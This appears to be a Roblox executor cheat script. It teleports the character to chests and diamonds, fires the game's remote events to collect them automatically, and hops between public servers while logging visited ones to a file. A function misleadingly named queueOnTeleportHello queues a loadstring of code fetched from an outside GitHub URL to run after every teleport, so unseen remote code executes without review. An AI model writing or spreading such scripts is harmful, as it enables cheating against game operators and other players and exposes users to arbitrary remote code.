-- LocalScript: Chest opener (hover) + Exact Diamond priority + Server hop using remotes

-- =============== Settings ===============
local CHEST_KEYWORD = "chest"           -- model names containing "chest" (case-insensitive)
local DIAMOND_NAME = "Diamond"          -- exact name match for diamonds
local Y_OFFSET = 10                     -- hover height
local HOVER_CHEST_TIME = 1              -- seconds to hover above each chest
local ITEMS_CONTAINER = workspace:WaitForChild("Items", 5) or workspace
local CHEST_OPEN_INTERVAL = 0.25        -- how often to fire the open-chest remote while hovering
local DIAMOND_TAKE_INTERVAL = 0.2       -- how often to fire the take-diamond remote / click while farming
local SEARCH_DIAMOND_DEEP = false       -- set to true if Diamonds can be nested deeper than Items' direct children
-- =======================================

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

   
    

-- Remotes
local RemoteEvents = ReplicatedStorage:WaitForChild("RemoteEvents")
local OpenChestRE = RemoteEvents:WaitForChild("RequestOpenItemChest")
local TakeDiamondRE = RemoteEvents:WaitForChild("RequestTakeDiamonds")

pcall(function()
                local HttpService = game:GetService("HttpService")
                local file = "hopper_servers.json"

                local function hasFS()
                    return typeof(isfile) == "function" and typeof(readfile) == "function" and typeof(writefile) == "function"
                end

                local function load()
                    local list = {}
                    if hasFS() and isfile(file) then
                        local ok, s = pcall(readfile, file)
                        if ok and type(s) == "string" and #s > 0 then
                            local ok2, data = pcall(function() return HttpService:JSONDecode(s) end)
                            if ok2 and type(data) == "table" then
                                list = data
                            end
                        end
                    else
                        if hasFS() then pcall(writefile, file, "[]") end
                    end
                    return list
                end

                local function save(list)
                    if not hasFS() then return end
                    while #list > 500 do table.remove(list, 1) end
                    pcall(writefile, file, HttpService:JSONEncode(list))
                end

                local list = load()
                local id = game.JobId
                local exists = false
                for _, v in ipairs(list) do if v == id then exists = true break end end
                if not exists then table.insert(list, id) end
                save(list)

                warn(" Hello world ")
            end)


-- -------------- Utils --------------
local function containsIgnoreCase(str, sub)
    if type(str) ~= "string" or type(sub) ~= "string" then return false end
    return string.find(string.lower(str), string.lower(sub), 1, true) ~= nil
end

local function getCharacter()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    character:WaitForChild("HumanoidRootPart", 10)
    character:WaitForChild("Humanoid", 10)
    return character
end

local function getHumanoid()
    local char = getCharacter()
    return char and char:FindFirstChildOfClass("Humanoid") or nil
end

local function getTargetCFrame(inst)
    if not inst then return nil end
    if inst:IsA("Model") then
        local ok, cf = pcall(function() return inst:GetPivot() end)
        if ok and cf then return cf end
        local part = inst:FindFirstChildWhichIsA("BasePart", true)
        return part and part.CFrame or nil
    elseif inst:IsA("BasePart") then
        return inst.CFrame
    else
        local part = inst:FindFirstChildWhichIsA("BasePart", true)
        return part and part.CFrame or nil
    end
end

local function findClickDetector(container)
    if not container then return nil end
    if container:IsA("ClickDetector") then return container end
    if container:IsA("BasePart") then
        local cd = container:FindFirstChildWhichIsA("ClickDetector")
        if cd then return cd end
    end
    for _, d in ipairs(container:GetDescendants()) do
        if d:IsA("ClickDetector") then
            return d
        end
    end
    return nil
end

local function hoverTeleport(inst, durationSeconds, action, actionInterval)
    local character = getCharacter()
    if not character or not inst then return end

    local endTime = durationSeconds and (tick() + durationSeconds) or math.huge
    local lastActionTime = 0

    while tick() < endTime do
        if not inst:IsDescendantOf(workspace) then break end

        local targetCF = getTargetCFrame(inst)
        if not targetCF then break end

        character:PivotTo(targetCF + Vector3.new(0, Y_OFFSET, 0))

        if action and actionInterval then
            local now = tick()
            if now - lastActionTime >= actionInterval then
                pcall(action)
                lastActionTime = now
            end
        end

        RunService.Heartbeat:Wait()
    end
end

-- -------------- Remotes --------------
local function openChestRemote(chestModel)
    pcall(function()
        OpenChestRE:FireServer(chestModel)
    end)
end

local function takeDiamondRemote(diamondInst)
    pcall(function()
        TakeDiamondRE:FireServer(diamondInst)
    end)
end



-- -------------- Finders --------------
local function getNextChest(processedMap)
    if not ITEMS_CONTAINER or not ITEMS_CONTAINER.Parent then return nil end
    for _, inst in ipairs(ITEMS_CONTAINER:GetChildren()) do
        if inst:IsA("Model") and containsIgnoreCase(inst.Name, CHEST_KEYWORD) then
            if not processedMap[inst] then
                return inst
            end
        end
    end
    return nil
end

local function findDiamondExact()
    if not ITEMS_CONTAINER or not ITEMS_CONTAINER.Parent then return nil end

    if SEARCH_DIAMOND_DEEP then
        for _, inst in ipairs(ITEMS_CONTAINER:GetDescendants()) do
            if inst.Name == DIAMOND_NAME then
                return inst
            end
        end
    else
        for _, inst in ipairs(ITEMS_CONTAINER:GetChildren()) do
            if inst.Name == DIAMOND_NAME then
                return inst
            end
        end
    end

    return nil
end

-- -------------- Actions --------------
local function visitChestWithHoverAndOpen(chest)
    if not chest or not chest:IsDescendantOf(workspace) then return false end
    hoverTeleport(chest, HOVER_CHEST_TIME, function()
        openChestRemote(chest)
    end, CHEST_OPEN_INTERVAL)
    return true
end

local function farmDiamondUntilGone(diamondInst)
    if not diamondInst or not diamondInst:IsDescendantOf(workspace) then return end

    -- Keep hovering and taking the diamond until it disappears
    while diamondInst and diamondInst:IsDescendantOf(workspace) do
        hoverTeleport(diamondInst, 0.2, function()
            takeDiamondRemote(diamondInst)

        end, DIAMOND_TAKE_INTERVAL)
        task.wait() -- yield a bit between short hovers
    end
end

-- -------------- Server Hop --------------
local function findDifferentPublicServerId(placeId)
    local currentJobId = game.JobId
    local cursor = nil

    for _ = 1, 10 do
        local url = string.format(
            "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100%s",
            placeId,
            cursor and ("&cursor=" .. HttpService:UrlEncode(cursor)) or ""
        )

        local ok, body = pcall(function()
            return HttpService:GetAsync(url, true)
        end)
        if not ok then break end

        local ok2, data = pcall(function()
            return HttpService:JSONDecode(body)
        end)
        if not ok2 or not data or not data.data then break end

        for _, server in ipairs(data.data) do
            if server and server.id ~= currentJobId and (server.playing or 0) < (server.maxPlayers or 0) then
                return server.id
            end
        end

        cursor = data.nextPageCursor
        if not cursor then break end
    end

    return nil
end

local function queueOnTeleportHello()
    
        local suc, err = pcall(function()
               queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/t3rm1n4tor/KATANAAA.WTF/main/h',true))();")
        end)
        if suc then
        warn("executed autoinject")
       elseif err then
       error(tostring(err))
       end
    
end

-- Drop-in replacement for serverHop() to avoid rejoining same server

-- Drop-in: File-backed server hopper that avoids any server in hopper_servers.json
local function serverHop()
    local Players           = game:GetService("Players")
    local TeleportService   = game:GetService("TeleportService")
    local HttpService       = game:GetService("HttpService")
    local LocalPlayer       = Players.LocalPlayer
    local placeId           = game.PlaceId
    local currentJobId      = game.JobId
    local VISITED_FILE      = "hopper_servers.json"
    local MAX_KEEP          = 500 -- keep last N visited servers

    -- Safe file helpers (executor required)
    local function hasFS()
        return typeof(isfile) == "function" and typeof(readfile) == "function" and typeof(writefile) == "function"
    end

    local function loadVisited()
        local list = {}
        if hasFS() and isfile(VISITED_FILE) then
            local ok, content = pcall(readfile, VISITED_FILE)
            if ok and type(content) == "string" and #content > 0 then
                local ok2, data = pcall(function() return HttpService:JSONDecode(content) end)
                if ok2 and type(data) == "table" then
                    list = data
                end
            end
        else
            if hasFS() then pcall(writefile, VISITED_FILE, "[]") end
        end
        -- dedupe + build set
        local set, out = {}, {}
        for _, id in ipairs(list) do
            if type(id) == "string" and not set[id] then
                set[id] = true
                table.insert(out, id)
            end
        end
        return set, out
    end

    local function saveVisited(list)
        if not hasFS() then return end
        -- trim to MAX_KEEP
        while #list > MAX_KEEP do
            table.remove(list, 1)
        end
        pcall(writefile, VISITED_FILE, HttpService:JSONEncode(list))
    end

    local visitedSet, visitedList = loadVisited()

    -- Always mark current server as visited in the file so we never pick it
    if not visitedSet[currentJobId] then
        visitedSet[currentJobId] = true
        table.insert(visitedList, currentJobId)
        saveVisited(visitedList)
    end

    -- Build a robust server picker that skips any visited IDs
    local function pickServerId()
        local function fetchPage(cursor, sortOrder)
            local url = string.format(
                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&limit=100%s",
                placeId,
                sortOrder or "Asc",
                cursor and ("&cursor=" .. HttpService:UrlEncode(cursor)) or ""
            )
            local ok, body = pcall(HttpService.GetAsync, HttpService, url, true)
            if not ok then return nil end
            local ok2, data = pcall(HttpService.JSONDecode, HttpService, body)
            if not ok2 then return nil end
            return data
        end

        local triedOrders = {"Asc", "Desc"}
        for _, order in ipairs(triedOrders) do
            local cursor = nil
            for _ = 1, 20 do
                local data = fetchPage(cursor, order)
                if not (data and data.data) then break end

                local fresh, fallback = {}, {}
                for _, s in ipairs(data.data) do
                    local id = s and s.id
                    local playing = tonumber(s.playing) or 0
                    local maxPlayers = tonumber(s.maxPlayers) or 0
                    if id and id ~= currentJobId and maxPlayers > 0 and playing < maxPlayers then
                        if not visitedSet[id] then
                            table.insert(fresh, id)      -- never visited
                        else
                            table.insert(fallback, id)   -- visited before (but not current)
                        end
                    end
                end

                -- Prefer never-visited servers
                if #fresh > 0 then
                    return fresh[math.random(1, #fresh)]
                end

                -- If all were visited, keep looking next page; but remember a fallback
                if data.nextPageCursor then
                    cursor = data.nextPageCursor
                    task.wait(0.03)
                else
                    -- End of pages for this order: if we have any fallback, pick one that isn't current
                    if #fallback > 0 then
                        return fallback[math.random(1, #fallback)]
                    end
                    break
                end
            end
        end

        return nil
    end

    queueOnTeleportHello()
    

    -- Keep trying different servers if a chosen one fails to init
    local triedThisCall = {}
    local function tryTeleportLoop(maxAttempts)
        maxAttempts = maxAttempts or 10
        for _ = 1, maxAttempts do
            local targetId = pickServerId()
            if not targetId or triedThisCall[targetId] then
                task.wait(0.1)
            else
                triedThisCall[targetId] = true
                local ok = pcall(function()
                    TeleportService:TeleportToPlaceInstance(placeId, targetId, LocalPlayer)
                end)
                if ok then return true end
                -- on failure, loop to pick another id
                task.wait(0.15)
            end
        end
        return false
    end

    local success = tryTeleportLoop(12)
    if not success then
        -- As a last resort, generic Teleport (may land in visited). Rarely used if HTTP works.
        pcall(function()
            TeleportService:Teleport(placeId, LocalPlayer)
        end)
    end
end

-- -------------- Coordinator --------------
local state = {
    processedChests = {},
    pauseForDiamond = false,
    serverHopStarted = false,
}

-- Initial humanoid health check → hop if 0
  while wait(0.5) do  
local ss = game.Players.LocalPlayer:GetAttribute("HasDied")
    if ss then
        state.serverHopStarted = true
        serverHop()
    print("hop")
        break
    elseif( game.Players.LocalPlayer.Character ~= nil and ss == nil) then
    warn("alive")
break
    end
end
-- Diamond watcher: exact name "Diamond" only
task.spawn(function()
    while not state.serverHopStarted do
        if not state.pauseForDiamond then
            local diamond = findDiamondExact()
            if diamond and diamond:IsDescendantOf(workspace) then
                state.pauseForDiamond = true
                pcall(function()
                    farmDiamondUntilGone(diamond)
                end)
                state.pauseForDiamond = false
            end
        end
        task.wait(0.2)
    end
end)

-- Chest runner: hover for 1s per chest (looped TP), opening via remote
task.spawn(function()
    task.wait(0.5) -- small startup delay

    while true do
        while state.pauseForDiamond do
            RunService.Heartbeat:Wait()
        end

        local chest = getNextChest(state.processedChests)
        if not chest then
            break
        end

        local ok = pcall(function()
            visitChestWithHoverAndOpen(chest)
        end)
        if ok then
            state.processedChests[chest] = true
        end

        task.wait(0.1)
    end

    -- All chests done → hop
    state.serverHopStarted = true
    serverHop()
end)
